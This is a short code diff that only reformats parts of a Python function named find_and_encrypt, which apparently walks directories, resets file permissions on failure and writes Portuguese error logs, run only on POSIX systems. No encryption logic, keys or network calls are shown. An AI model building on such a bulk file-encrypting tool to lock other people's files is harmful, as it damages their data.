@@ -146,14 +146,13 @@ def find_and_encrypt(
                             )
 
                         except Exception:
-                            if (not os.chmod(
-                                    os.path.join(
-                                        root,
-                                        file
-                                    ), 0o644
-                                )
+                            if not os.chmod(
+                                os.path.join(
+                                    root,
+                                    file
+                                ), 0o644
                             ):
-
+                           
                                 logs = [
                                     ('Erro ao alterar permissões de arquivo.\n'),
                                     (f'Arquivos => {os.path.join(root, file)}\n')
@@ -163,14 +162,10 @@ def find_and_encrypt(
                                     if lf.write(
                                         logs[0]
                                     ):
-                                        lf.write(
-                                            logs[1]
-                                        )
+                                        lf.write(logs[1])
                                         
                                         print(f'\33[32mLogs gerado em {lf}\33[0m')
 
 
 if __name__ == '__main__':
-    check_os(
-        osname='posix'
-    )
+    check_os('posix')
